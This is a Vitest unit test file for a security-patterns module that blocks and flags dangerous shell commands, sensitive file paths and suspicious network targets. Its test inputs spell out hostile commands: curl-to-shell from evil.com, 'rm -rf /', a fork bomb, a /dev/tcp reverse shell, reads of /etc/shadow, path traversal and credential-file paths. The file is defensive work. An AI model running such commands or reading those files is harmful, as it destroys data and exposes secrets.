/**
 * Security Patterns Tests
 * @module test/unit/security/patterns.test
 */

import { describe, it, expect } from 'vitest';
import {
  DANGEROUS_PATTERNS,
  BLOCKED_COMMANDS,
  SENSITIVE_PATTERNS,
  DANGEROUS_PATH_PATTERNS,
  SUSPICIOUS_NETWORK_PATTERNS,
  SHELL_ESCAPE_CHARS,
  RiskLevel,
  PATTERN_RISK_LEVELS,
  matchesAnyPattern,
  getMatchingPatterns,
  isBlockedCommand,
  isSensitivePath,
  isDangerousPath
} from '../../../src/security/patterns.js';

describe('Security Patterns', () => {
  describe('DANGEROUS_PATTERNS', () => {
    it('should be frozen', () => {
      expect(Object.isFrozen(DANGEROUS_PATTERNS)).toBe(true);
    });

    it('should detect rm -rf with root path', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -rf /'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -rf /home'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -r /'))).toBe(true);
    });

    it('should detect rm -rf with parent directory', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -rf ..'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('rm -rf ../something'))).toBe(true);
    });

    it('should detect Windows recursive delete', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('rmdir /s /q'))).toBe(true);
    });

    it('should detect chmod 777', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('chmod 777 /var'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('chmod -R 777 /'))).toBe(true);
    });

    it('should detect piped execution from curl/wget', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('curl http://evil.com | sh'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('curl http://site.com | bash'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('wget http://site.com | sh'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('curl http://site.com | python'))).toBe(true);
    });

    it('should detect history clearing', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('history -c'))).toBe(true);
    });

    it('should detect system file overwrites', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('echo x > /etc/passwd'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('cat > /etc/shadow'))).toBe(true);
    });

    it('should detect LD_PRELOAD injection', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('export LD_PRELOAD=/lib/evil.so'))).toBe(true);
    });

    it('should detect kernel module commands', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('insmod malicious.ko'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('modprobe evil'))).toBe(true);
    });

    it('should detect process killing', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('kill -9 -1'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('killall -9 everything'))).toBe(true);
    });

    it('should detect Windows format command', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('format c:'))).toBe(true);
      expect(DANGEROUS_PATTERNS.some(p => p.test('del /s /q c:\\'))).toBe(true);
    });

    it('should NOT match safe commands', () => {
      expect(DANGEROUS_PATTERNS.some(p => p.test('ls -la'))).toBe(false);
      expect(DANGEROUS_PATTERNS.some(p => p.test('npm install'))).toBe(false);
      expect(DANGEROUS_PATTERNS.some(p => p.test('git status'))).toBe(false);
    });
  });

  describe('BLOCKED_COMMANDS', () => {
    it('should be frozen', () => {
      expect(Object.isFrozen(BLOCKED_COMMANDS)).toBe(true);
    });

    it('should contain rm -rf /', () => {
      expect(BLOCKED_COMMANDS).toContain('rm -rf /');
      expect(BLOCKED_COMMANDS).toContain('rm -rf /*');
    });

    it('should contain fork bomb', () => {
      expect(BLOCKED_COMMANDS).toContain(':(){:|:&};:');
    });

    it('should contain credential access commands', () => {
      expect(BLOCKED_COMMANDS).toContain('cat /etc/shadow');
      expect(BLOCKED_COMMANDS).toContain('cat /etc/passwd');
    });

    it('should contain reverse shell patterns', () => {
      expect(BLOCKED_COMMANDS).toContain('bash -i >& /dev/tcp/');
    });

    it('should contain privilege escalation commands', () => {
      expect(BLOCKED_COMMANDS).toContain('sudo su -');
      expect(BLOCKED_COMMANDS).toContain('sudo bash');
    });
  });

  describe('SENSITIVE_PATTERNS', () => {
    it('should be frozen', () => {
      expect(Object.isFrozen(SENSITIVE_PATTERNS)).toBe(true);
    });

    it('should match .env files', () => {
      expect(SENSITIVE_PATTERNS.some(p => p.test('.env'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('.env.local'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('.env.production'))).toBe(true);
    });

    it('should match credential files', () => {
      expect(SENSITIVE_PATTERNS.some(p => p.test('credentials.json'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('secrets.json'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('secrets.yaml'))).toBe(true);
    });

    it('should match SSH keys', () => {
      expect(SENSITIVE_PATTERNS.some(p => p.test('id_rsa'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('id_ed25519'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('server.pem'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('private.key'))).toBe(true);
    });

    it('should match API key files', () => {
      expect(SENSITIVE_PATTERNS.some(p => p.test('api_key.txt'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('apikey'))).toBe(true);
    });

    it('should match database files', () => {
      expect(SENSITIVE_PATTERNS.some(p => p.test('data.db'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('app.sqlite'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('database.sqlite3'))).toBe(true);
    });

    it('should match cloud credential files', () => {
      expect(SENSITIVE_PATTERNS.some(p => p.test('.aws/credentials'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('service_account.json'))).toBe(true);
    });

    it('should match shell history', () => {
      expect(SENSITIVE_PATTERNS.some(p => p.test('.bash_history'))).toBe(true);
      expect(SENSITIVE_PATTERNS.some(p => p.test('.zsh_history'))).toBe(true);
    });
  });

  describe('DANGEROUS_PATH_PATTERNS', () => {
    it('should be frozen', () => {
      expect(Object.isFrozen(DANGEROUS_PATH_PATTERNS)).toBe(true);
    });

    it('should detect path traversal', () => {
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('../etc/passwd'))).toBe(true);
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('..\\windows\\system32'))).toBe(true);
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('%2e%2e/'))).toBe(true);
    });

    it('should detect null byte injection', () => {
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('file.txt%00.jpg'))).toBe(true);
    });

    it('should detect Unix system directories', () => {
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('/etc/passwd'))).toBe(true);
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('/root/.ssh'))).toBe(true);
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('/proc/self'))).toBe(true);
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('/dev/sda'))).toBe(true);
    });

    it('should detect Windows system directories', () => {
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('c:\\windows\\system32'))).toBe(true);
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('C:\\Windows\\'))).toBe(true);
    });

    it('should detect sensitive home directories', () => {
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('.ssh/id_rsa'))).toBe(true);
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('.aws/credentials'))).toBe(true);
      expect(DANGEROUS_PATH_PATTERNS.some(p => p.test('.kube/config'))).toBe(true);
    });
  });

  describe('SUSPICIOUS_NETWORK_PATTERNS', () => {
    it('should be frozen', () => {
      expect(Object.isFrozen(SUSPICIOUS_NETWORK_PATTERNS)).toBe(true);
    });

    it('should detect paste services', () => {
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('https://pastebin.com/raw/abc'))).toBe(true);
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('https://hastebin.com/raw/xyz'))).toBe(true);
    });

    it('should detect raw GitHub URLs', () => {
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('https://raw.githubusercontent.com/user/repo'))).toBe(true);
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('https://gist.githubusercontent.com/user'))).toBe(true);
    });

    it('should detect private network ranges', () => {
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('192.168.1.1'))).toBe(true);
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('10.0.0.1'))).toBe(true);
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('172.16.0.1'))).toBe(true);
    });

    it('should detect localhost', () => {
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('127.0.0.1'))).toBe(true);
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('http://localhost'))).toBe(true);
    });

    it('should detect common reverse shell ports', () => {
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('host:4444'))).toBe(true);
      expect(SUSPICIOUS_NETWORK_PATTERNS.some(p => p.test('host:1337'))).toBe(true);
    });
  });

  describe('SHELL_ESCAPE_CHARS', () => {
    it('should be frozen', () => {
      expect(Object.isFrozen(SHELL_ESCAPE_CHARS)).toBe(true);
    });

    it('should contain command substitution characters', () => {
      expect(SHELL_ESCAPE_CHARS).toContain('`');
      expect(SHELL_ESCAPE_CHARS).toContain('$');
    });

    it('should contain pipe and redirect characters', () => {
      expect(SHELL_ESCAPE_CHARS).toContain('|');
      expect(SHELL_ESCAPE_CHARS).toContain('>');
      expect(SHELL_ESCAPE_CHARS).toContain('<');
    });

    it('should contain quotes', () => {
      expect(SHELL_ESCAPE_CHARS).toContain('"');
      expect(SHELL_ESCAPE_CHARS).toContain("'");
    });

    it('should contain command separators', () => {
      expect(SHELL_ESCAPE_CHARS).toContain(';');
      expect(SHELL_ESCAPE_CHARS).toContain('&');
    });

    it('should contain glob characters', () => {
      expect(SHELL_ESCAPE_CHARS).toContain('*');
      expect(SHELL_ESCAPE_CHARS).toContain('?');
    });
  });

  describe('RiskLevel', () => {
    it('should have all levels', () => {
      expect(RiskLevel.NONE).toBe('none');
      expect(RiskLevel.LOW).toBe('low');
      expect(RiskLevel.MEDIUM).toBe('medium');
      expect(RiskLevel.HIGH).toBe('high');
      expect(RiskLevel.CRITICAL).toBe('critical');
    });

    it('should be frozen', () => {
      expect(Object.isFrozen(RiskLevel)).toBe(true);
    });
  });

  describe('PATTERN_RISK_LEVELS', () => {
    it('should map pattern categories to risk levels', () => {
      expect(PATTERN_RISK_LEVELS.DANGEROUS_PATTERNS).toBe(RiskLevel.CRITICAL);
      expect(PATTERN_RISK_LEVELS.BLOCKED_COMMANDS).toBe(RiskLevel.CRITICAL);
      expect(PATTERN_RISK_LEVELS.SENSITIVE_PATTERNS).toBe(RiskLevel.HIGH);
      expect(PATTERN_RISK_LEVELS.DANGEROUS_PATH_PATTERNS).toBe(RiskLevel.HIGH);
      expect(PATTERN_RISK_LEVELS.SUSPICIOUS_NETWORK_PATTERNS).toBe(RiskLevel.MEDIUM);
    });

    it('should be frozen', () => {
      expect(Object.isFrozen(PATTERN_RISK_LEVELS)).toBe(true);
    });
  });

  describe('matchesAnyPattern()', () => {
    it('should return true when input matches a pattern', () => {
      expect(matchesAnyPattern('rm -rf /', DANGEROUS_PATTERNS)).toBe(true);
    });

    it('should return false when input matches no patterns', () => {
      expect(matchesAnyPattern('ls -la', DANGEROUS_PATTERNS)).toBe(false);
    });

    it('should return false for null input', () => {
      expect(matchesAnyPattern(null, DANGEROUS_PATTERNS)).toBe(false);
    });

    it('should return false for undefined input', () => {
      expect(matchesAnyPattern(undefined, DANGEROUS_PATTERNS)).toBe(false);
    });

    it('should return false for non-string input', () => {
      expect(matchesAnyPattern(123, DANGEROUS_PATTERNS)).toBe(false);
    });
  });

  describe('getMatchingPatterns()', () => {
    it('should return matching patterns', () => {
      const matches = getMatchingPatterns('chmod 777 /var', DANGEROUS_PATTERNS);
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0].test('chmod 777 /var')).toBe(true);
    });

    it('should return empty array for no matches', () => {
      const matches = getMatchingPatterns('npm install', DANGEROUS_PATTERNS);
      expect(matches).toEqual([]);
    });

    it('should return empty array for null input', () => {
      expect(getMatchingPatterns(null, DANGEROUS_PATTERNS)).toEqual([]);
    });

    it('should return empty array for non-string input', () => {
      expect(getMatchingPatterns({}, DANGEROUS_PATTERNS)).toEqual([]);
    });
  });

  describe('isBlockedCommand()', () => {
    it('should return true for exact blocked command', () => {
      expect(isBlockedCommand('rm -rf /')).toBe(true);
      expect(isBlockedCommand('cat /etc/shadow')).toBe(true);
    });

    it('should return true for blocked command with extra args', () => {
      expect(isBlockedCommand('rm -rf / --no-preserve-root')).toBe(true);
    });

    it('should be case insensitive', () => {
      expect(isBlockedCommand('RM -RF /')).toBe(true);
      expect(isBlockedCommand('Cat /etc/shadow')).toBe(true);
    });

    it('should return false for safe commands', () => {
      expect(isBlockedCommand('rm file.txt')).toBe(false);
      expect(isBlockedCommand('cat README.md')).toBe(false);
    });

    it('should return false for null input', () => {
      expect(isBlockedCommand(null)).toBe(false);
    });

    it('should return false for non-string input', () => {
      expect(isBlockedCommand(123)).toBe(false);
    });
  });

  describe('isSensitivePath()', () => {
    it('should return true for .env files', () => {
      expect(isSensitivePath('.env')).toBe(true);
      expect(isSensitivePath('.env.local')).toBe(true);
    });

    it('should return true for SSH keys', () => {
      expect(isSensitivePath('id_rsa')).toBe(true);
      expect(isSensitivePath('/home/user/.ssh/id_ed25519')).toBe(true);
    });

    it('should return true for credential files', () => {
      expect(isSensitivePath('secrets.json')).toBe(true);
      expect(isSensitivePath('credentials.json')).toBe(true);
    });

    it('should return false for normal files', () => {
      expect(isSensitivePath('README.md')).toBe(false);
      expect(isSensitivePath('package.json')).toBe(false);
      expect(isSensitivePath('index.js')).toBe(false);
    });
  });

  describe('isDangerousPath()', () => {
    it('should return true for path traversal', () => {
      expect(isDangerousPath('../etc/passwd')).toBe(true);
      expect(isDangerousPath('..\\windows')).toBe(true);
    });

    it('should return true for system directories', () => {
      expect(isDangerousPath('/etc/passwd')).toBe(true);
      expect(isDangerousPath('/proc/self')).toBe(true);
    });

    it('should return true for sensitive home paths', () => {
      expect(isDangerousPath('.ssh/config')).toBe(true);
      expect(isDangerousPath('.aws/credentials')).toBe(true);
    });

    it('should return false for normal paths', () => {
      expect(isDangerousPath('/home/user/project')).toBe(false);
      expect(isDangerousPath('./src/index.js')).toBe(false);
    });
  });
});
